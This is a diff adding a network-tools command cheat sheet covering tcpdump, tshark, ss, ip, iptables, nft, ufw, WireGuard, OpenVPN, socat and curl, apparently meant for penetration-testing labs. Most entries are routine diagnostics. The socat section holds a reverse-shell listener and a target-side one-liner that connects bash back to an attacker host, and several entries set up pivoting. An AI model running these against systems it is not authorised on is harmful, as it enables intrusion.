@@ -1,0 +1,137 @@
+;; Packet capture, firewalls, tunnels, and general network diagnostics.
+
+%tool tcpdump
+%cat command
+%tags network,capture
+
+@ Capture on an interface, resolve nothing (fast, quiet) || sudo tcpdump -i {{iface}} -n
+~ capture
+
+@ Capture to a file for later analysis in Wireshark || sudo tcpdump -i {{iface}} -w {{outfile:capture.pcap}}
+~ save
+
+@ Filter to one host and port || sudo tcpdump -i {{iface}} host {{target}} and port {{port}}
+~ filter
+
+@ Read back a capture file with full packet bytes || tcpdump -r {{capture.pcap}} -X
+~ read
+
+%tool tshark
+%tags network,capture
+
+@ Capture and show only HTTP requests live || tshark -i {{iface}} -Y http.request
+~ filter,http
+
+@ Extract a specific field across a whole capture (e.g. DNS queries) || tshark -r {{capture.pcap}} -T fields -e dns.qry.name -Y dns
+~ extract
+
+%tool ss
+%cat command
+%tags network,sockets
+
+@ Listening TCP/UDP sockets with process names || ss -tulpn
+~ listening
+? what is listening on my ports
+
+@ All established connections || ss -tan state established
+
+%tool ip
+%tags network,config
+
+@ Show addresses on every interface || ip -c a
+~ addresses
+
+@ Show the routing table || ip route
+~ routing
+
+@ Bring an interface up/down || sudo ip link set {{iface}} up
+~ iface
+
+@ Add a static route through a pivot || sudo ip route add {{subnet}} via {{gateway}}
+~ pivot
+
+%tool nmcli
+%tags network,wifi,config
+
+@ List and connect to a Wi-Fi network || nmcli device wifi connect "{{ssid}}" password "{{pass}}"
+~ wifi
+
+@ Show current connection status || nmcli connection show --active
+
+%tool iptables
+%cat command
+%tags firewall,linux
+
+@ List current rules with line numbers || sudo iptables -L -n -v --line-numbers
+~ list
+
+@ Allow a port in || sudo iptables -A INPUT -p tcp --dport {{port}} -j ACCEPT
+~ allow
+
+@ NAT for pivoting traffic through this box || sudo iptables -t nat -A POSTROUTING -o {{iface}} -j MASQUERADE
+~ nat,pivot
+
+%tool nft
+%tags firewall,linux
+
+@ List the active nftables ruleset || sudo nft list ruleset
+~ list
+`nft` is the modern replacement for iptables on current distros; both can coexist via the `iptables-nft` compat layer.
+
+@ Add a rule to an existing chain || sudo nft add rule inet filter input tcp dport {{port}} accept
+~ allow
+
+%tool ufw
+%cat command
+%tags firewall,linux
+
+@ Enable and allow SSH first (avoid locking yourself out) || sudo ufw allow ssh && sudo ufw enable
+~ enable
+
+@ Allow a specific port || sudo ufw allow {{port}}/tcp
+~ allow
+
+@ Show current rules with numbers (for deleting) || sudo ufw status numbered
+~ status
+
+%tool wg
+%cat command
+%tags vpn,wireguard
+
+@ Show active WireGuard tunnels || sudo wg show
+~ status
+
+@ Bring a tunnel up from its config || sudo wg-quick up {{config_name}}
+~ connect
+
+%tool openvpn
+%tags vpn
+
+@ Connect using a .ovpn profile (HTB/THM style) || sudo openvpn {{profile.ovpn}}
+~ connect
+? htb vpn lab access
+
+%tool socat
+%cat command
+%tags network,relay
+
+@ TCP port relay / forwarder || socat TCP-LISTEN:{{local_port}},fork TCP:{{target}}:{{remote_port}}
+~ relay
+? forward port pivot
+
+@ Fully interactive reverse shell listener (readline, tab-complete) || socat file:`tty`,raw,echo=0 tcp-listen:{{lport:4444}}
+~ listener,shell
+On the target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{lhost}}:{{lport:4444}}`.
+
+%tool curl
+%cat command
+%tags network,http
+
+@ Follow redirects and show response headers || curl -sIL {{url}}
+~ headers
+
+@ Send through a proxy (e.g. Burp) || curl -x http://127.0.0.1:8080 -k {{url}}
+~ proxy
+
+@ Download a file || curl -o {{outfile}} {{url}}
+~ download
